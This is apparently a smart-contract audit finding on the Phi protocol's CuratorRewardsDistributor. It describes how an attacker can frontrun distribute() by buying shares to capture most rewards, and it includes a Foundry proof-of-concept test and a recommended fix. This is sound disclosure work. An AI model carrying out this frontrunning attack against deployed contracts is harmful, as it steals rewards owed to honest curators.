# Vulnerability details

## Impact

Loss of funds: curators can be deprived of their rewards due to frontrunning/sandwiching of `CuratorRewardsDistributor`'s `deposit()` / `distribute()`.


## Summary

The algorithm design of `CuratorRewardsDistributor` is too simplistic, and allows anyone to frontrun the call to  `CuratorRewardsDistributor::distribute()` / sandwich the call to `CuratorRewardsDistributor::deposit()` in order to get the majority of the rewards. Here is the scenario:

1. The owner submits the `deposit` transaction for to a certain `credId`
2. An attacker notices the transaction in the mempool, and frontruns `distribute()` as follows:
   - the attacker buys a large number of shares of `credId`
   - `deposit()` is executed
   - the attacker executes `distribute()` immediately after, thus receiving most of the rewards
   - the attackers gets rid of the now unneeded shares

Notice that a similar issue has been raised in [Renascence audit report](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/docs/audit/Renascence%20-%20Phi%20Audit%20Report.pdf) under the title "[H-1] Reward distribution is vulnerable to flash loan attacks". The proposed and implemented solution (introducing a cooldown period before selling the purchased shares), while being effective specifically against flash loan attacks, is ineffective for protecting against stealing distributed rewards. The attack still works as long as the distributed reward is larger than the fees paid for buying and selling the amount of shares needed to receive more rewards than the honest curators. The attack economics stays the same; the only difference wrt. the flash loan attack is that in the attack described here the attacker needs to possess own funds, while in the flash loan case they can borrow and repay them within the same transaction.

The attack will work always as long as the distribution of rewards is based on the momentary snapshot of shares; instead, the accounting needs to be performed who and for how long holds the shares. This approach is implemented in the so called "Billion dollar algorithm", originally from SushiSwap's MasterChef, and now broadly applied whenever rewards need to be distributed to shareholders. For a description see e.g. [The staking algorithm of Sushiswap MasterChef and Synthetix](https://www.rareskills.io/post/staking-algorithm).


## Proof of Concept

Drop this test to [CuratorRewardsDistributor.t.sol](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/test/CuratorRewardsDistributor.t.sol#L36) and execute via `forge test --match-test Kuprum`

```solidity
function testKuprum_FrontrunDeposit() public {
    uint256 credId = 1;
    uint256 depositAmount = 1 ether;

    // User 1 buys 1 share
    vm.startPrank(user1);
    vm.deal(user1, bondingCurve.getBuyPriceAfterFee(credId, 1, 1));
    cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 1, 1) }(credId, 1, 0);
    vm.stopPrank();

    // Normal course of events: user1 gets 1/2 of the rewards
    
    // Record initial balance
    uint256 initialUser1Balance = phiRewards.balanceOf(user1);

    vm.startPrank(owner);
    vm.deal(owner, 1 ether);
    // Owner deposits some ETH to the curatorRewardsDistributor
    curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);
    // Owner distributes rewards
    curatorRewardsDistributor.distribute(credId);
    vm.stopPrank();

    // Check final balances
    uint256 finalUser1Balance = phiRewards.balanceOf(user1);

    // Assert the distribution
    assertEq(
        finalUser1Balance - initialUser1Balance,
        (depositAmount - depositAmount / 100) / 2,
        "User1 should receive 1/2 of the rewards"
    );

    // Frontrunning: user1 gets 1/100 of the rewards,
    // while user2 gets 98/100 of the rewards
    
    // Record initial balances
    initialUser1Balance = phiRewards.balanceOf(user1);
    uint256 initialUser2Balance = phiRewards.balanceOf(user2);

    vm.startPrank(owner);
    vm.deal(owner, 1 ether);
    // Owner deposits some ETH to the curatorRewardsDistributor
    curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);

    // User2 notices the deposit, and frontruns distribute()
    vm.startPrank(user2);
    vm.deal(user2, bondingCurve.getBuyPriceAfterFee(credId, 2, 98));
    cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 2, 98) }(credId, 98, 0);
    // User2 also distributes themselves
    curatorRewardsDistributor.distribute(credId);

    // Owner distributes rewards the call fails, because user2 has distributed already
    vm.startPrank(owner);
    vm.expectRevert(ICuratorRewardsDistributor.NoBalanceToDistribute.selector);
    curatorRewardsDistributor.distribute(credId);

    // Check final balances
    finalUser1Balance = phiRewards.balanceOf(user1);
    uint256 finalUser2Balance = phiRewards.balanceOf(user2);


    // Assert the distribution
    assertEq(
        finalUser1Balance - initialUser1Balance,
        (depositAmount - depositAmount / 100) / 100,
        "User1 receives only 1/100 of the rewards"
    );
    assertEq(
        finalUser2Balance - initialUser2Balance,
        (depositAmount - depositAmount / 100) * 98 / 100,
        "User2 receives 98/100 of the rewards"
    );

    // User2 sells the shares they don't need anymore
    vm.startPrank(user2);
    vm.warp(block.timestamp + 10 minutes + 1 seconds);
    cred.sellShareCred(credId, 98, 0);
    vm.stopPrank();
}
```

## Tools Used

Manual review; Foundry.

## Recommended Mitigation Steps

We recommend to re-design the reward distribution mechanism following the _billion dollar algorithm_ as implemented e.g. in [MakerDAO's StakingRewards](https://github.com/makerdao/endgame-toolkit/blob/6e8de2dfccfb5ef2930b6e41bc74a0c6b9ae0c15/src/synthetix/StakingRewards.sol).
